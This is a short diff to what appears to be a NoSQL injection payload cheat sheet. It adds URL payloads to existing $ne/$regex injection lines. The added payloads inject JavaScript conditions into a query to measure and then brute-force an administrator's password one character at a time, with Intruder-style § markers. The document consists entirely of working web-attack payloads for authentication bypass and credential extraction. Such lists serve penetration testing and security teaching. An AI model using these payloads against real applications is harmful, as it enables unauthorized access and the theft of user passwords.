@@ -47,6 +47,10 @@ in JSON
 ```json
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
+
+In URL:
+administrator' && this.password.length < 30 || 'a'=='b
+administrator' && this.password[§0§]=='§a§ << Using brute force to find the administrator's password
 ```
 
 ### Extract data information
